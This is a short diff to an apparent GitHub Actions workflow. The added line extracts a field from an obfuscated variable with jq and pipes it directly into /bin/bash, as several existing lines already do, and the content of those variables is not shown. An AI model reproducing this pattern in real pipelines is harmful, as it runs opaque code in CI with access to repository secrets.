@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$bzb1" | jq -r .bgqys01 | /bin/bash
           echo $ca44 | jq -r .ae4771 | /bin/bash
           printf '%s' "$zjb41" | jq -r .glfy9 | /bin/bash
+          printf '%s' "$lh0365" | jq -r .tslw966 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
